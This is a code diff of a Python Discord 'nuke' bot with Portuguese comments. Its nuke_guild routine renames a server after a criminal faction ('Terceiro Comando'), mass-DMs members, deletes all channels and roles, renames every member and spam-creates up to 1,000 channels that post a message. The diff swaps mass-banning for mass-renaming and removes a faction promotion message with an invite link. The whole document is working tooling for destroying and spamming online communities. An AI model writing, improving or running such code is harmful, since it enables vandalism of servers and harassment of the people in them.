@@ -5,7 +5,6 @@ from os import name as os_name, system
 from sys import exit
 import asyncio
 import threading
-from tqdm import tqdm
 
 init()
 
@@ -47,15 +46,16 @@ async def delete_all_roles(guild):
             continue
     return deleted
 
-async def ban_all_members(guild):
-    banned = 0
+async def rename_all_members(guild, prefix):
+    renamed = 0
     for member in guild.members:
         try:
-            await member.ban()
-            banned += 1
+            new_nick = f'{prefix} ({member.name})'
+            await member.edit(nick=new_nick)
+            renamed += 1
         except:
             continue
-    return banned
+    return renamed
 
 async def send_direct_message(member, message):
     try:
@@ -68,48 +68,45 @@ async def notify_members(guild, message):
         if not any(permission in member.guild_permissions for permission in ['kick_members', 'ban_members']) and not any(role.permissions.administrator for role in member.roles):
             await send_direct_message(member, message)
 
-async def create_text_channels_and_send_messages(guild, name, message, stop_event):
+async def create_text_channels_and_send_message(guild, name, message, stop_event):
     created = 0
-    total_channels = 0
     
-    while total_channels < 10000 and not stop_event.is_set():
+    while created < 1000 and not stop_event.is_set():
         tasks = []
-        for _ in range(10):
-            if total_channels >= 10000 or stop_event.is_set():
-                break
+        for _ in range(1):  # Cria 1 canal de texto por vez
             try:
                 channel = await guild.create_text_channel(name=name)
-                tasks.append(asyncio.create_task(send_messages(channel, message)))
+                tasks.append(asyncio.create_task(channel.send(message)))
                 created += 1
-                total_channels += 1
             except:
                 continue
         
         await asyncio.gather(*tasks)
-        await asyncio.sleep(2)
+        await asyncio.sleep(1)  # Intervalo entre a criação dos canais
     
     return created
 
-async def send_messages(channel, message):
-    for _ in range(10):
-        try:
-            await channel.send(message)
-        except:
-            continue
-
 async def nuke_guild(guild, name, message, stop_event):
     print(f'{r}Iniciando Nuke no servidor: {y}{guild.name}')
-    await guild.edit(name="TERCEIRO COMANDO DA CAPITAL 🇮🇶")
     
+    # Renomeia o servidor
+    await guild.edit(name="T . C . C TERCEIRO COMANDO")
+    
+    # Notifica os membros via DM
     await notify_members(guild, message)
     
-    banned = await ban_all_members(guild)
+    # Renomeia os membros
+    renamed = await rename_all_members(guild, '(T.C.C)')
+    
+    # Deleta canais e papéis
     deleted_channels = await delete_all_channels(guild)
     delete_roles = await delete_all_roles(guild)
-    created_text_channels = await create_text_channels_and_send_messages(guild, name, message, stop_event)
+    
+    # Cria canais de texto e envia mensagens
+    created_text_channels = await create_text_channels_and_send_message(guild, name, message, stop_event)
     
     print(f'{g}Servidor {w}{guild.name}{g} atualizado com sucesso!')
-    print(f'{y}Usuários banidos: {g}{banned}')
+    print(f'{y}Membros renomeados: {g}{renamed}')
     print(f'{y}Canais deletados: {g}{deleted_channels}')
     print(f'{y}Papéis deletados: {g}{delete_roles}')
     print(f'{y}Canais de texto criados: {g}{created_text_channels}')
@@ -170,7 +167,7 @@ if __name__ == '__main__':
     
     token = _input(f'{y}Insira o token do bot:{g}')
     name = _input(f'{y}Insira o nome para os canais criados:{g}')
-    message = f'@everyone @here\n\n# DKZIN DOMINA\nhttps://discord.com/invite/gZSx3n8Csa\n\n## TERCEIRO COMANDO NA FRENTE DE TODOS'
+    message = 'Mensagem para todos os canais de texto'
     
     asyncio.run(main(token, name, message, stop_event))
     stop_thread.join()
